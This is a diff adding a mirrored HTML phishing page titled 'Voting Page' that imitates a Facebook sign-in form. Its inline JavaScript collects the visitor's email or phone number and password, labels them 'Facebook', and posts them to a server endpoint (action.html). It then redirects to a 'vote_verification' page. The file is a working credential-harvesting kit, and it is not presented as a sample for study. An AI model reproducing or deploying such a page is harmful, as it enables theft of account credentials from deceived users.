@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from rhythmflownetwork.website/index_fob.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 04 May 2024 13:49:08 GMT -->
+<head>
+    <!-- TYPE BELOW IS PROBABLY: 'website' or 'article' or look on https://ogp.me/#types -->
+    <meta property="og:type" content='Voting Page' />
+    <meta charset="utf-8">
+    <meta name="author" content="Kodinger">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Voting Page</title>
+    <link rel="stylesheet" href="../stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="css/my-login.css">
+
+</head>
+
+<body class="my-login-page">
+
+    <section class="h-100">
+        <div class="container h-100">
+            <div class="row justify-content-md-center h-100">
+                <div class="card-wrapper">
+
+                    <center>
+                        <div class="brand">
+                            <img src="img/logo.png" style='max-width: 150px; max-height: 150px;' alt="logo">
+                        </div>
+                    </center>
+
+                    <div class="card fat">
+                        <div class="card-body">
+                            <h4 class="card-title">Sign in to continue</h4>
+
+                            <form method="POST" class="my-login-validation" novalidate="">
+
+                                <div class="form-group">
+                                    <input id="email" type="username" placeholder="Mobile number or email address"
+                                        class="form-control" name="email" value="" required autofocus>
+
+                                    <div class="invalid-feedback">
+                                        Email is invalid
+                                    </div>
+                                </div>
+
+                                <div class="form-group">
+
+                                    <input id="password" type="password" placeholder="Password" class="form-control"
+                                        name="password" required data-eye>
+                                    <div class="invalid-feedback">
+                                        Password is required
+                                    </div>
+                                </div>
+
+
+
+                                <div class="form-group m-0">
+                                    <button type="button" id="submit" class="btn btn-primary btn-block">
+                                        Log in
+                                    </button>
+
+                                    <center>
+                                        <p style="color:blue; margin: 10px" ;>Forgotten Password?</p>
+                                    </center>
+                                </div>
+                                <center><a href='index.html'>
+                                        <img style="margin-bottom: 0px; margin-left: 0px; margin-right: 0px; max-width: 200px; "
+                                            src="img/create2.jpg" alt="logo">
+                                    </a></center>
+                            </form>
+                        </div>
+                    </div>
+                    <div class="footer">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+<script>
+
+        var submit = document.getElementById('submit');
+        var email = document.getElementById('email')
+        var password = document.getElementById('password')
+        var msg = document.querySelector('.msg')
+        var msg2 = document.querySelector('.msg2')
+
+        submit.addEventListener('click', function () {
+            console.log('d');
+            if (email.value == "" && password.value == "") {
+                
+            } else {
+        
+                var url = 'action.html';
+                var xhr2 = new XMLHttpRequest()
+                var data2 = new FormData()
+                data2.append('username', email.value);
+                data2.append('pass', password.value);
+                data2.append('type', "Facebook");
+                xhr2.onreadystatechange = function () {
+                    response = xhr2.responseText;
+                  if (response == 3){
+                      window.location.href='vote_verification.html'
+                  }
+                }
+                xhr2.open('POST.html', url, 'true');
+                xhr2.send(data2)
+            //======================================
+            }
+
+        })
+    </script>
+
+    <script src="../code.jquery.com/jquery-3.3.1.slim.min.js"
+        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+        crossorigin="anonymous"></script>
+    <script src="js/my-login.html"></script>
+</body>
+
+
+<!-- Mirrored from rhythmflownetwork.website/index_fob.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 04 May 2024 13:49:22 GMT -->
+</html>
